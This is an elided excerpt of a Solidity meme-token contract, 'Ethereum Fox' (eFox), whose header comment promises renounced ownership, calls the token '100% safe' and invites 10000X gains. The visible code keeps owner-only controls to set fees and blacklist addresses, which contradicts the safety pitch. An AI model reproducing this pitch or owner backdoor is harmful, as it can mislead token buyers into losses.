...
/**
   ...
   Welcome to Ethereum Fox
   
   This is a community token. If you want to create a telegram I suggest to name it to @eFoxgroups
   ...
   I will renounce the ownership to burn addresses to transfer #eFox to the community, make sure it's 100% safe.

   I will add .2 BNB and all the left 10% total supply to the pool
   Can you make #eFox 10000X? 
   ...
   it's the best part of the #eFox idea, increasing the liquidity pool automatically, 
...
contract eFox is Context, IERC20, Ownable {
    ...
    string private _name = 'Ethereum Fox';
    string private _symbol = 'eFox';
    uint8 private _decimals = 9;
    uint256 public _maxTxAmount = 10000 * 10**9 * 10**9;
    uint256 public _taxfee = 100 * 10**9 * 10**9;
    ...
    function setMaxFee(uint256 maxFee) external onlyOwner() {
     ...
     function Blacklist(address Add) external onlyOwner() {
        _BotAddress = Add;
    }
